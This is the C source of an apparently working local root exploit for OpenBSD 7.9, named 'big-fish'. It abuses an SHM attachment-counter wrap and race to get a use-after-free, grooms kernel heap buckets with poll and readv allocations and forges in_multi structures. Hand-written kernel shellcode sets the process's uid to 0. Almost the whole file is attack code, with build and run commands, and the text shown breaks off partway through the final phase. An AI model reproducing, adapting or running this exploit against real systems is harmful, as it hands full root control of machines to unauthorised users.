/*
 * big-fish.c - local privilege escalation for OpenBSD
 *
 * The SHM attachment-counter wrap and detach race publish NEW with a freed
 * UAO.  A four-page SPRAY segment reuses it; a fault through NEW's larger map
 * writes SWSLOT_BAD through u_swslots[7] into an adjacent ip_moptions.
 *
 * At the 64th multicast join the pointer vector grows to 127 entries (1016
 * bytes in kmem-1024).  First drain that bucket with held poll allocations,
 * then cycle a fresh four-object page using readv(-1, iov, 64).  sys_readv
 * copies the 1024-byte M_IOV before rejecting the fd; free poisons only the
 * first 64 bytes.  The controlled final qword survives the 1016-byte M_ZERO.
 * A second, blocking readv supplies the adjacent live M_IOV.
 *
 * The corrupted close-time walk decrements the shell page's recursive PTE
 * twice, converting the RX user page to a writable/executable supervisor
 * page.  A forged in_multi invokes enc0->if_ioctl, clears cr_uid, restores
 * the interface callback, repairs the loop, and recounts NEW's descriptor
 * reference.  The normal SHM teardown then removes both aliases.
 *
 * Vulnerability historians may find this flaw interesting, as
 * https://github.com/weiss/original-bsd/blame/master/sys/sys/shm.h#L33
 * indicates the core of the issue goes back ~37 years, however with
 * SHMSEG set to 8, you'd need something like ~4096 child processes, which
 * would very likely count as a fork bomb back then ;)
 *
 * Build: cc -O2 -Wall -Wextra -pthread -o big-fish big-fish.c
 * Run:   ./big-fish [root-shell-command]
 */

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/sysctl.h>
#include <sys/malloc.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <setjmp.h>
#include <poll.h>
#include <stdint.h>

/* ------------------------------------------------------------------ */
/* Per-machine constants for the supplied OpenBSD 7.9 QEMU VM. */
/* ------------------------------------------------------------------ */

/* Compile-time architectural constants (never change). */
#define PTE_BASE		0x00007f8000000000ULL

/* Chosen empty user range used to identify SPRAY's vm_map entry. */
#define RECOUNT_MAP_VA		0x0000001000000000ULL

/* Autoconf-time kmem_map; live-verified on the supplied 7.9 VM. */
#define LO0_IFNET_KVA		0xffff800000175000ULL
#define ENC0_IFNET_KVA		0xffff800000174800ULL

/* struct ifnet offsets (measured on OpenBSD 7.9 GENERIC.MP#449). */
#define IFNET_IOCTL_OFF		0x2b8

/* struct in_multi offsets. */
#define INM_TQE_NEXT_OFF	0x00
#define INM_TQE_PREV_OFF	0x08
#define INM_REFCNT_OFF		0x18
#define INM_TRACEIDX_OFF	0x1c
#define INM_IFIDX_OFF		0x20
#define INM_ADDR_OFF		0x2c
#define INM_STATE_OFF		0x38
#define INM_RTI_OFF		0x40
#define PAGE_SHIFT		12

/* ------------------------------------------------------------------ */
/* Tunables                                                            */
/* ------------------------------------------------------------------ */

#define TARGET_WRAP	32768
#define NVICTIMS	6
#define FSLICE		(8*1024*1024)
#define SCRATCH_FILE	"/tmp/big-fish.dat"
#define DRAIN16_N	960	/* permits the retained slab on a second run */
#define GROUPS		127	/* max=127 => invalid swap slot on this VM */
#define NEW_SIZE	(4*1024*1024)		/* 1024 pages -> K reach */

#define SETTLE_SEC	2
#define POST_USLEEP	5000

/* ------------------------------------------------------------------ */

struct vcmd { int id; };
struct hcmd { int op; int arg; };		/* 0=attach NEW, 1=probe K, 2=shmdt */
struct hrep {
	int	 outcome;	/* 0=read ok, 1=SIGSEGV/BUS (=> OOB write -1) */
	unsigned val;
	void	*va;
};

/* --- globals inherited across fork --- */
static int	 shmseg;
static long	 pgsz;
static int	 file_fd = -1;
static int	 vpipe[NVICTIMS][2];
static int	 hcmd_pipe[2];
static int	 hrep_pipe[2];

/* --- parent-only bookkeeping --- */
static pid_t	 victim_pid[NVICTIMS];
static pid_t	 helper_pid;
static pid_t	*stale;
static int	 nstale, stale_used;
static int	 hold_wr = -1;

static uint64_t	 shell_va;
static uint64_t	 shell_pte;
static uint64_t	 shell_pte_fake;
static uint64_t	 dummy_pte_fake;
static uint64_t	 fake_inm_va;
static unsigned	 enc0_ifidx, lo0_ifidx;

/*
 * Wait for reorder_kernel (KARL relink) to finish.  It's launched at
 * the end of /etc/rc as `reorder_kernel &` and runs `make newbsd` +
 * `make newinstall` in /usr/share/relink/kernel/GENERIC.MP -- large
 * ld(1) invocation with many transient >8K M_TEMP allocs that leave a
 * boot-varying kmem_map hole set until it exits.  After it's gone (and
 * a settle delay), kmem_map best-fit is deterministic.
 */
static int
root_proc_running(const char *comm)
{
	int mib[6] = { CTL_KERN, KERN_PROC, KERN_PROC_UID, 0,
	    sizeof(struct kinfo_proc), 512 };
	struct kinfo_proc *kp;
	size_t len = 0;
	int i, n, found = 0;

	sysctl(mib, 6, NULL, &len, NULL, 0);
	kp = malloc(len + 4096);
	len += 4096;
	if (sysctl(mib, 6, kp, &len, NULL, 0) < 0) {
		free(kp);
		return 0;
	}
	n = len / sizeof(*kp);
	for (i = 0; i < n && !found; i++)
		if (strcmp(kp[i].p_comm, comm) == 0)
			found = 1;
	free(kp);
	return found;
}

static void
wait_for_settle(void)
{
	int n;
	printf("[*] waiting for reorder_kernel to finish ...\n");
	for (n = 0; n < 300; n++) {
		/* reorder_kernel.sh -> make newbsd -> ld; make newinstall.
		 * p_comm is the executable basename, so no self-match. */
		if (!root_proc_running("reorder_kernel") &&
		    !root_proc_running("make") &&
		    !root_proc_running("ld") &&
		    !root_proc_running("ld.lld"))
			break;
		sleep(2);
	}
	printf("[*] reorder_kernel done after %d s; settling %d s ...\n",
	    n * 2, SETTLE_SEC);
	sleep(SETTLE_SEC);
}

/* KERN_MALLOCSTATS helpers used for adaptive heap grooming. */

static uint64_t
km_totalfree(int bsz)
{
	uint64_t buf[16];
	int mib[4] = { CTL_KERN, KERN_MALLOCSTATS, KERN_MALLOC_BUCKET, bsz };
	size_t sz = sizeof(buf);
	if (sysctl(mib, 4, buf, &sz, NULL, 0) == -1)
		return 0;
	return buf[5];		/* kb_totalfree (after 24-byte XSIMPLEQ_HEAD) */
}
static inline uint64_t
carrier_totalfree(void)
{
	return km_totalfree(1024);
}

static void
km_stat(int bsz, const char *tag)
{
	uint64_t buf[16];
	int mib[4] = { CTL_KERN, KERN_MALLOCSTATS, KERN_MALLOC_BUCKET, bsz };
	size_t sz = sizeof(buf);
	if (sysctl(mib, 4, buf, &sz, NULL, 0) == -1) {
		fprintf(stderr, "[km%d] %-24s sysctl: %s\n", bsz, tag,
		    strerror(errno));
		return;
	}
	fprintf(stderr, "[km%-3d] %-24s calls=%llu total=%llu inuse=%llu "
	    "free=%llu\n", bsz, tag,
	    (unsigned long long)buf[3], (unsigned long long)buf[4],
	    (unsigned long long)(buf[4] - buf[5]),
	    (unsigned long long)buf[5]);
}

/* ================================================================== */
/* tier3b: shm_nattch wrap + race machinery (unchanged)                */
/* ================================================================== */

static short
get_nattch(int id)
{
	struct shmid_ds ds;
	if (shmctl(id, IPC_STAT, &ds) == -1)
		return 0x7fff;
	return ds.shm_nattch;
}

static void
stat_seg(const char *tag, int id)
{
	struct shmid_ds ds;
	if (shmctl(id, IPC_STAT, &ds) == -1) {
		printf("[*] %-30s id=0x%08x <gone>\n", tag, id);
		return;
	}
	printf("[*] %-30s id=0x%08x slot=%d nattch=%d\n",
	    tag, id, id & 0xffff, (int)ds.shm_nattch);
}

static void *
contender_main(void *unused)
{
	unsigned char fill = 0;
	void *fmap;

	(void)unused;
	fmap = mmap(NULL, FSLICE, PROT_READ|PROT_WRITE, MAP_SHARED,
	    file_fd, 0);
	if (fmap == MAP_FAILED) {
		warn("victim: mmap file");
		return NULL;
	}
	for (;;) {
		memset(fmap, fill++, FSLICE);
		if (msync(fmap, FSLICE, MS_SYNC) == -1)
			warn("victim: msync");
	}
	return NULL;
}

static void __dead
victim_main(int idx)
{
	struct vcmd cmd;
	pthread_t t;
	void *X, *r;

	if (read(vpipe[idx][0], &cmd, sizeof(cmd)) != sizeof(cmd))
		_exit(1);
	X = mmap(NULL, pgsz, PROT_READ|PROT_WRITE,
	    MAP_ANON|MAP_PRIVATE, -1, 0);
	if (X == MAP_FAILED)
		err(1, "victim: mmap X");
	if (pthread_create(&t, NULL, contender_main, NULL) != 0)
		errx(1, "victim: pthread_create");
	usleep(20000);
	for (;;) {
		r = shmat(cmd.id, X, 0);
		if (r != (void *)-1)
			errx(1, "victim: shmat succeeded?!");
		if (errno == EINVAL)
			break;
	}
	_exit(0);
}

/* Helper H: holds the dangling map entry, does OOB K probes. */
static sigjmp_buf	 probe_jb;
static volatile int	 probe_sig;
static void
probe_sigh(int sig)
{
	probe_sig = sig;
	siglongjmp(probe_jb, 1);
}
static void __dead
helper_main(void)
{
	struct hcmd c;
	struct hrep r;
	volatile unsigned char *H_va = NULL;
	struct sigaction sa;

	if (read(hcmd_pipe[0], &c, sizeof(c)) != sizeof(c))
		_exit(1);
	H_va = shmat(c.arg, NULL, 0);
	if (H_va == (void *)-1)
		err(1, "helper: shmat NEW");
	memset(&r, 0, sizeof(r));
	r.va = (void *)H_va;
	write(hrep_pipe[1], &r, sizeof(r));

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = probe_sigh;
	sigemptyset(&sa.sa_mask);
	sigaction(SIGSEGV, &sa, NULL);
	sigaction(SIGBUS,  &sa, NULL);

	for (;;) {
		if (read(hcmd_pipe[0], &c, sizeof(c)) != sizeof(c))
			_exit(2);
		if (c.op == 2) {
			memset(&r, 0, sizeof(r));
			errno = 0;
			r.outcome = shmdt((void *)H_va);
			r.val = (unsigned)errno;
			write(hrep_pipe[1], &r, sizeof(r));
			_exit(r.outcome == 0 ? 0 : 3);
		}
		if (c.op != 1)
			_exit(2);
		memset(&r, 0, sizeof(r));
		r.va = (void *)(H_va + (size_t)c.arg * pgsz);
		probe_sig = 0;
		if (sigsetjmp(probe_jb, 1) == 0) {
			r.val = *(volatile unsigned *)
			    (H_va + (size_t)c.arg * pgsz);
			r.outcome = 0;
		} else {
			r.outcome = 1;
			r.val = (unsigned)probe_sig;
		}
		write(hrep_pipe[1], &r, sizeof(r));
	}
	/* NOTREACHED */
	_exit(2);
}

static void
create_scratch_file(void)
{
	printf("[*] creating %d MB scratch file %s ...\n",
	    FSLICE >> 20, SCRATCH_FILE);
	file_fd = open(SCRATCH_FILE, O_RDWR|O_CREAT|O_TRUNC, 0600);
	if (file_fd == -1)
		err(1, "open %s", SCRATCH_FILE);
	if (ftruncate(file_fd, FSLICE) == -1)
		err(1, "ftruncate");
	fsync(file_fd);
}

static void
raise_nproc(void)
{
	struct rlimit rl;
	if (getrlimit(RLIMIT_NPROC, &rl) == -1)
		err(1, "getrlimit");
	rl.rlim_cur = rl.rlim_max;
	setrlimit(RLIMIT_NPROC, &rl);
	if (getrlimit(RLIMIT_NOFILE, &rl) == -1)
		err(1, "getrlimit NOFILE");
	rl.rlim_cur = rl.rlim_max;
	setrlimit(RLIMIT_NOFILE, &rl);
}

static int
do_wrap(void)
{
	struct shmid_ds ds;
	int nforks, bank, holdpipe[2], id1, i;
	pid_t pid;
	void *p;
	char ch;

	/* Leave one record genuinely unused in the exploit process.  Three
	 * additional children compensate for banking 127 rather than 128
	 * records per vmspace and still cross the signed 16-bit boundary. */
	bank = shmseg - 1;
	nforks = (TARGET_WRAP + bank - 1) / bank - 1;
	if (pipe(holdpipe) == -1)
		err(1, "pipe hold");
	hold_wr = holdpipe[1];
	stale = calloc(nforks, sizeof(pid_t));
	if (stale == NULL)
		err(1, "calloc");

	id1 = shmget(IPC_PRIVATE, pgsz, IPC_CREAT|0600);
	if (id1 == -1)
		err(1, "shmget id1");
	printf("[*] id1=0x%08x slot=%d\n", id1, id1 & 0xffff);
	for (i = 0; i < bank; i++) {
		p = shmat(id1, NULL, 0);
		if (p == (void *)-1)
			err(1, "shmat #%d", i);
		munmap(p, pgsz);
	}
	printf("[*] forking %d stale children ...\n", nforks);
	for (i = 0; i < nforks; i++) {
		pid = fork();
		if (pid == -1)
			err(1, "fork stale #%d", i);
		if (pid == 0) {
			close(hold_wr);
			read(holdpipe[0], &ch, 1);
			_exit(0);
		}
		stale[i] = pid;
		nstale = i + 1;
	}
	close(holdpipe[0]);

	if (shmctl(id1, IPC_STAT, &ds) == -1)
		err(1, "IPC_STAT id1");
	printf("[*] id1 nattch after wrap = %d\n", (int)ds.shm_nattch);
	if (ds.shm_nattch > 0)
		errx(1, "wrap failed");
	if (shmctl(id1, IPC_RMID, NULL) == -1)
		err(1, "IPC_RMID id1");
	if (shmctl(id1, IPC_STAT, &ds) == 0)
		errx(1, "id1 survived RMID");
	printf("[+] id1 freed; %d stale records banked; one parent slot free\n",
	    (nforks + 1) * bank);
	return id1 & 0xffff;
}

static int
consume_stale_child(void)
{
	if (stale_used >= nstale)
		return -1;
	kill(stale[stale_used], SIGTERM);
	waitpid(stale[stale_used], NULL, 0);
	stale_used++;
	return 0;
}

static int
race_once(int slot, int vidx, int *new_id_out)
{
	struct vcmd vc;
	int id, new_id, n, status;

	id = shmget(IPC_PRIVATE, pgsz, IPC_CREAT|0600);
	if (id == -1)
		err(1, "shmget id_N");
	if ((id & 0xffff) != slot)
		warnx("id_N slot %d != %d", id & 0xffff, slot);
	if (consume_stale_child() == -1)
		errx(1, "out of stale children");
	stat_seg("id_N (baseline)", id);
	if (get_nattch(id) >= 0) {
		shmctl(id, IPC_RMID, NULL);
		return 0;
	}
	vc.id = id;
	if (write(vpipe[vidx][1], &vc, sizeof(vc)) != sizeof(vc))
		err(1, "write vpipe");
	{
		struct shmid_ds ds;
		int base = get_nattch(id);
		time_t t0 = time(NULL);
		printf("[*] polling for nattch==%d ...\n", base + 1);
		for (;;) {
			if (shmctl(id, IPC_STAT, &ds) == -1)
				errx(1, "id_N vanished");
			if (ds.shm_nattch == base + 1) {
				shmctl(id, IPC_RMID, NULL);
				new_id = shmget(IPC_PRIVATE, NEW_SIZE,
				    IPC_CREAT|0600);
				break;
			}
			if (time(NULL) - t0 > 10) {
				printf("[-] timeout; window not seen\n");
				shmctl(id, IPC_RMID, NULL);
				kill(victim_pid[vidx], SIGKILL);
				waitpid(victim_pid[vidx], NULL, 0);
				return 0;
			}
		}
	}
	if (new_id == -1)
		err(1, "shmget NEW");
	printf("[*] fired: NEW=0x%08x slot=%d; waiting for V...\n",
	    new_id, new_id & 0xffff);
	waitpid(victim_pid[vidx], &status, 0);
	(void)status;
	n = get_nattch(new_id);
	stat_seg("NEW after V exit", new_id);
	if (n == -1) {
		printf("[+] HIT: V's uao_detach() freed NEW_UAO while NEW "
		    "is still published\n");
		*new_id_out = new_id;
		return 1;
	}
	printf("[-] miss (NEW.nattch=%d)\n", n);
	shmctl(new_id, IPC_RMID, NULL);
	return 0;
}

/* Payload and blocking readv carrier. */
static void
prepare_shell_page(void)
{
	uint8_t payload[] = {
		0xf3, 0x0f, 0x1e, 0xfa,       /* endbr64 */
		0xeb, 0x0a, 0x90, 0x90,       /* jmp +10; overwritten qword */
		0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90,
		0x65, 0x48, 0x8b, 0x04, 0x25, /* mov %gs:0x98,%rax */
		0x98, 0x00, 0x00, 0x00,
		0x48, 0x8b, 0x90, 0x30, 0x02, 0x00, 0x00, /* p->p_ucred */
		0xc7, 0x42, 0x08, 0x00, 0x00, 0x00, 0x00, /* cr_uid=0 */
		0x48, 0x8b, 0x4d, 0xd8,       /* saved caller r14 = imo */
		0x48, 0xc7, 0x41, 0x08, 0x00, 0x00, 0x00, 0x00, /* imo+8=0 */
		/* Find entry whose start==RECOUNT_MAP_VA in vm_map.addr. */
		0x48, 0x8b, 0x50, 0x40,       /* p->p_vmspace */
		0x48, 0x8b, 0x52, 0x10,       /* vm_map.addr.rbt_root */
		0x48, 0xb9,                   /* movabs RECOUNT_MAP_VA,%rcx */
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x85, 0xd2,             /* loop: test %rdx,%rdx */
		0x74, 0x1c,                   /* NULL: skip recount */
		0x48, 0x39, 0x4a, 0x40,       /* cmp %rcx,entry->start */
		0x74, 0x0e,                   /* equal: found */
		0x72, 0x06,                   /* start<VA: right */
		0x48, 0x8b, 0x52, 0x08,       /* entry=entry->rbt_left */
		0xeb, 0xed,                   /* loop */
		0x48, 0x8b, 0x52, 0x10,       /* right: entry->rbt_right */
		0xeb, 0xe7,                   /* loop */
		0x48, 0x8b, 0x52, 0x60,       /* found: entry->object.uvm_obj */
		0xf0, 0xff, 0x42, 0x1c,       /* lock incl uobj->uo_refs */
		0x48, 0xb8,                   /* movabs &lo0->if_ioctl,%rax */
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x8b, 0x00,             /* mov (%rax),%rax */
		0x49, 0x89, 0x87, 0xb8, 0x02, 0x00, 0x00, /* enc->if_ioctl=%rax */
		0x45, 0x31, 0xf6,             /* saved caller r14 = NULL */
		0x31, 0xc0, 0xc3              /* return 0 */
	};
	uint8_t *p;

	p = mmap(NULL, 2 * pgsz, PROT_READ|PROT_WRITE,
	    MAP_PRIVATE|MAP_ANON, -1, 0);
	if (p == MAP_FAILED)
		err(1, "mmap shell pages");
	memset(p, 0x90, 2 * pgsz);
	*(uint64_t *)(payload + 61) = RECOUNT_MAP_VA;
	*(uint64_t *)(payload + 104) = LO0_IFNET_KVA + IFNET_IOCTL_OFF;
	memcpy(p, payload, sizeof(payload));
	shell_va = (uint64_t)(uintptr_t)p;
	fake_inm_va = shell_va + 0x100;
	*(uint64_t *)(p + 0x100 + INM_TQE_NEXT_OFF) = shell_va;
	*(uint64_t *)(p + 0x100 + INM_TQE_PREV_OFF) =
	    ENC0_IFNET_KVA + IFNET_IOCTL_OFF;
	*(uint32_t *)(p + 0x100 + INM_REFCNT_OFF) = 1;
	*(uint32_t *)(p + 0x100 + INM_TRACEIDX_OFF) = 0;
	*(uint32_t *)(p + 0x100 + INM_IFIDX_OFF) = enc0_ifidx;
	*(uint32_t *)(p + 0x100 + INM_ADDR_OFF) = 0;
	*(uint32_t *)(p + 0x100 + INM_STATE_OFF) = 0;
	memcpy(p + 0x80, "\xf3\x0f\x1e\xfa\xc3", 5);
	if (mprotect(p, 2 * pgsz, PROT_READ|PROT_EXEC) == -1)
		err(1, "mprotect shell pages RX");
	/* pmap adds permissions on demand.  Execute a benign entry on this
	 * leaf once so its hardware PTE has NX clear before direct editing. */
	((void (*)(void))(p + 0x80))();
	shell_pte = PTE_BASE + ((shell_va >> PAGE_SHIFT) * 8);
	shell_pte_fake = shell_pte - INM_REFCNT_OFF;
	dummy_pte_fake = shell_pte_fake + 8;
	printf("[*] user RX shell=%#llx; fixed PTE=%#llx; decrement args=%#llx/%#llx\n",
	    (unsigned long long)shell_va, (unsigned long long)shell_pte,
	    (unsigned long long)shell_pte_fake,
	    (unsigned long long)dummy_pte_fake);
	printf("[*] fake in_multi is inside shell page at %#llx\n",
	    (unsigned long long)fake_inm_va);
}

/* Dynamic kmem-1024 drain using held poll(128) M_TEMP allocations. */
static pthread_t carrier_holds[512];
static int ncarrier_holds;

static void *
hole_fill_holder(void *arg)
{
	struct pollfd *pfd;
	int j, n = (int)(uintptr_t)arg;
	pfd = calloc(n, sizeof(*pfd));
	for (j = 0; j < n; j++) pfd[j].fd = -1;
	poll(pfd, n, -1);	/* mallocarray(n,8,M_TEMP) -> kmem-<n*8>, held */
	for (;;) pause();
	return NULL;
}

static int
carrier_drain(int want_free)
{
	int j, batch;
	uint64_t f0 = carrier_totalfree();

	while (carrier_totalfree() > (uint64_t)want_free) {
		batch = (int)(carrier_totalfree() - want_free);
		if (batch > 64) batch = 64;
		for (j = 0; j < batch; j++) {
			if (ncarrier_holds >= (int)(sizeof(carrier_holds) /
			    sizeof(carrier_holds[0])) ||
			    pthread_create(&carrier_holds[ncarrier_holds], NULL,
			    hole_fill_holder, (void *)(uintptr_t)128) != 0)
				errx(1, "carrier holder limit");
			ncarrier_holds++;
		}
		usleep(50000);
	}
	printf("[*] 3a: %d held poll(128) km1024 carriers (was free=%llu, "
	    "now=%llu)\n", ncarrier_holds, (unsigned long long)f0,
	    (unsigned long long)carrier_totalfree());
	return ncarrier_holds;
}

/*
 * The bucket queue is FIFO: allocate at the head, free at the tail.
 * Starting empty, four EBADF readv calls create and cycle one fresh page.
 * Every object then carries our harmless pointer in the final eight bytes.
 */
static void
stage_carriers(void)
{
	struct iovec iov[64];
	uint64_t n, j;
	int i;

	carrier_drain(0);
	for (i = 0; i < 64; i++) {
		iov[i].iov_base = (void *)(uintptr_t)dummy_pte_fake;
		iov[i].iov_len = (size_t)dummy_pte_fake;
	}
	/* Four elements per 4K page. */
	n = (uint64_t)pgsz / sizeof(iov);
	for (j = 0; j < n; j++) {
		errno = 0;
		if (readv(-1, iov, 64) != -1 || errno != EBADF)
			errx(1, "readv carrier churn did not return EBADF");
	}
	printf("[*] EBADF readv primed %llu kmem-1024 objects (free=%llu)\n",
	    (unsigned long long)n, (unsigned long long)carrier_totalfree());
}

/* readv keeps its controlled 1024-byte M_IOV copy across pipe_read(). */
static int post_pipe[2];
static void *
post_iov_holder(void *arg)
{
	struct iovec iov[64];
	int j;
	(void)arg;
	memset(iov, 0, sizeof(iov));
	/* Membership values beginning at index 16.  The two large iov_len
	 * values are still far below SSIZE_MAX, and iovec_copyin does not
	 * validate base addresses. */
	iov[0].iov_base = (void *)(uintptr_t)shell_pte_fake;	/* first decrement */
	iov[0].iov_len  = (size_t)shell_pte_fake;		/* second decrement */
	iov[1].iov_base = (void *)(uintptr_t)fake_inm_va;		/* [18]: P1 */
	iov[1].iov_len  = (size_t)dummy_pte_fake;		/* [19]: harmless */
	iov[2].iov_base = (void *)(uintptr_t)dummy_pte_fake;	/* not reached */
	iov[2].iov_len  = 1;
	for (j = 3; j < 64; j++) {
		iov[j].iov_base = (void *)(uintptr_t)dummy_pte_fake;
		iov[j].iov_len  = 0;
	}
	readv(post_pipe[0], iov, 64);		/* held M_IOV kmem-1024 */
	for (;;) pause();
	return NULL;
}

static void
find_interfaces(void)
{
	enc0_ifidx = if_nametoindex("enc0");
	lo0_ifidx  = if_nametoindex("lo0");
	if (enc0_ifidx == 0 || lo0_ifidx == 0)
		errx(1, "if_nametoindex enc0=%u lo0=%u", enc0_ifidx, lo0_ifidx);
	printf("[*] enc0 ifidx=%u lo0 ifidx=%u\n", enc0_ifidx, lo0_ifidx);
}

int
main(int argc, char **argv)
{
	int mib[3] = { CTL_KERN, KERN_SHMINFO, KERN_SHMINFO_SHMSEG };
	size_t sl = sizeof(shmseg);
	struct hcmd hc;
	struct hrep hr;
	int slot, i, new_id = -1, spray_id = -1, hits;
	pthread_t post_th;
	int drain16[DRAIN16_N], target = -1;
	void *recount_map = (void *)-1;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	pgsz = sysconf(_SC_PAGESIZE);

	find_interfaces();
	printf("========================================================\n");
	printf(" SHMCTL-01: OpenBSD 7.9 readv-only carrier.\n");
	printf(" uid=%u\n", getuid());
	printf("========================================================\n\n");

	wait_for_settle();
	prepare_shell_page();

	if (sysctl(mib, 3, &shmseg, &sl, NULL, 0) == -1)
		err(1, "sysctl shmseg");
	if (shmseg <= 0 || TARGET_WRAP % shmseg != 0)
		errx(1, "shmseg=%d unusable", shmseg);
	raise_nproc();
	create_scratch_file();

	/* Fork clean helpers/victims BEFORE any shm activity. */
	if (pipe(hcmd_pipe) == -1 || pipe(hrep_pipe) == -1)
		err(1, "pipe helper");
	for (i = 0; i < NVICTIMS; i++)
		if (pipe(vpipe[i]) == -1)
			err(1, "pipe vpipe[%d]", i);
	helper_pid = fork();
	if (helper_pid == -1)
		err(1, "fork helper");
	if (helper_pid == 0) {
		close(hcmd_pipe[1]); close(hrep_pipe[0]);
		for (i = 0; i < NVICTIMS; i++) {
			close(vpipe[i][0]); close(vpipe[i][1]);
		}
		helper_main();
	}
	close(hcmd_pipe[0]); close(hrep_pipe[1]);
	for (i = 0; i < NVICTIMS; i++) {
		victim_pid[i] = fork();
		if (victim_pid[i] == -1)
			err(1, "fork victim %d", i);
		if (victim_pid[i] == 0) {
			int j;
			for (j = 0; j < NVICTIMS; j++) {
				close(vpipe[j][1]);
				if (j != i) close(vpipe[j][0]);
			}
			close(hcmd_pipe[1]); close(hrep_pipe[0]);
			victim_main(i);
		}
		close(vpipe[i][0]);
	}
	printf("[*] helper + %d victims forked (clean vm_shm)\n", NVICTIMS);

	/* --- Phase 1: wrap --- */
	slot = do_wrap();

	/* --- Phase 2: race until we get a hit --- */
	for (i = 0, hits = 0; i < NVICTIMS && !hits; i++) {
		printf("\n=== race attempt %d/%d ===\n", i + 1, NVICTIMS);
		hits = race_once(slot, i, &new_id);
	}
	for (; i < NVICTIMS; i++) {
		kill(victim_pid[i], SIGKILL);
		waitpid(victim_pid[i], NULL, 0);
	}
	if (!hits) {
		printf("\n[!] no hit after %d attempts; aborting.\n", NVICTIMS);
		goto cleanup_fail;
	}

	/*
	 * Release stale children now.  Each shmexit()s 128 stale records
	 * into slot=NEW: shm_delete_mapping() decrements NEW.nattch (goes
	 * very negative -- harmless, NEW is not SHMSEG_REMOVED so no
	 * dealloc) and uvm_unmap()s a 4MB range in the exiting child's own
	 * map (child is inside exit1(), never returns to userland).
	 * Frees ~250 process slots for Phase 3's threads/fds.
	 */
	printf("\n[*] releasing %d stale children ...\n", nstale - stale_used);
	if (hold_wr >= 0) {
		close(hold_wr);
		hold_wr = -1;
	}
	for (i = stale_used; i < nstale; i++)
		waitpid(stale[i], NULL, 0);
	stale_used = nstale;
	stat_seg("NEW after stale drain", new_id);

	/* Phase 3: prepare the small-object adjacency first. */
	printf("\n[*] Phase 3: readv carrier + kmem-16 groom ...\n");
	if (pipe(post_pipe) == -1)
		err(1, "pipe post");

	/* 3c-3e back-to-back (no usleep). */
	{
		int hlim = 2, j, nd16 = 0;
		u_char ttl = 2;
		for (j = 0; j < DRAIN16_N && km_totalfree(16) != 0; j++) {
			drain16[j] = socket(AF_INET6, SOCK_DGRAM, 0);
			if (drain16[j] == -1)
				err(1, "drain socket6 #%d", j);
			if (setsockopt(drain16[j], IPPROTO_IPV6,
			    IPV6_MULTICAST_HOPS, &hlim, sizeof(hlim)) == -1)
				err(1, "drain HOPS #%d", j);
			nd16++;
		}
		if (km_totalfree(16) != 0)
			errx(1, "could not drain kmem-16 to zero within %d sockets",
			    DRAIN16_N);
		spray_id = shmget(IPC_PRIVATE, 4 * pgsz, IPC_CREAT|0600);
		if (spray_id == -1)
			err(1, "shmget SPRAY");
		recount_map = shmat(spray_id,
		    (void *)(uintptr_t)RECOUNT_MAP_VA, 0);
		if (recount_map != (void *)(uintptr_t)RECOUNT_MAP_VA)
			err(1, "shmat SPRAY recount mapping");
		target = socket(AF_INET, SOCK_DGRAM, 0);
		if (target == -1)
			err(1, "target socket");
		if (setsockopt(target, IPPROTO_IP, IP_MULTICAST_TTL,
		    &ttl, sizeof(ttl)) == -1)
			err(1, "target IP_MULTICAST_TTL");
		printf("[*] 3c: KERN_MALLOCSTATS drained kmem-16 exactly with %d holders\n",
		    nd16);
	}
	km_stat(128, "3c-3e: v6drain+SPRAY+target");
	km_stat(16,  "3c-3e: v6drain+SPRAY+target");
	stat_seg("3d: SPRAY (4 pages)", spray_id);
	printf("[*] 3e: target v4 fd=%d; fresh-page adjacency assumed, "
	    "127-entry carrier will expose [127]=PTE decrement %#llx\n", target,
	    (unsigned long long)shell_pte_fake);
	printf("[*] 3e: recount map=%p exposes SPRAY UAO to kernel payload\n",
	    recount_map);

	/* Grow max/num to 127.  This makes the initial 32-bit swapslot at
	 * imo+12 equal 0x007f007f (> the configured swap partition), while
	 * leaving exactly 8 slack bytes at membership[127]. */
	{
		struct ip_mreq mr;
		int j;
		memset(&mr, 0, sizeof(mr));
		mr.imr_interface.s_addr = htonl(INADDR_LOOPBACK);
		for (j = 1; j <= GROUPS; j++) {
			if (j == 64)
				stage_carriers();
			mr.imr_multiaddr.s_addr = htonl(0xef010100U + j);
			if (setsockopt(target, IPPROTO_IP, IP_ADD_MEMBERSHIP,
			    &mr, sizeof(mr)) == -1)
				err(1, "target ADD_MEMBERSHIP #%d", j);
		}
	}
	km_stat(1024, "3g: after 127 joins (carrier C)");

	/* The held M_IOV copy lands at C+1024 and supplies membership[128..]. */
	if (pthread_create(&post_th, NULL, post_iov_holder, NULL) != 0)
		err(1, "pthread_create post");
	usleep(POST_USLEEP);
	km_stat(1024, "3f: after POST M_IOV");
	printf("[*] 3f: POST gives [128..129]=PTEdec [130]=fake inm\n");

	/* --- Phase 4: OOB K=7 -> imo.{num,max}=0xffff --- */
	printf("\n[*] Phase 4: OOB K=7 -> imo.{num,max}=0xffff\n");
	hc.op = 0; hc.arg = new_id;
	write(hcmd_pipe[1], &hc, sizeof(hc));
	if (read(hrep_pipe[0], &hr, sizeof(hr)) != sizeof(hr))
		errx(1, "helper died attaching NEW");
	printf("[*] helper H_va = %p\n", hr.va);
	{
		static const int kcand[] = { 7 };
		int hit = -1;
		for (i = 0; i < (int)(sizeof(kcand) / sizeof(kcand[0])); i++) {
			hc.op = 1; hc.arg = kcand[i];
			write(hcmd_pipe[1], &hc, sizeof(hc));
			if (read(hrep_pipe[0], &hr, sizeof(hr)) != sizeof(hr))
				errx(1, "helper died probing K=%d", kcand[i]);
			if (hr.outcome == 1) {
				hit = kcand[i];
				break;
			}
			printf("[*] K=%d returned %#x; trying the other fresh slot\n",
			    kcand[i], hr.val);
		}
		if (hit == -1) {
			printf("[-] neither fresh kmem-16 order reached max_memberships\n");
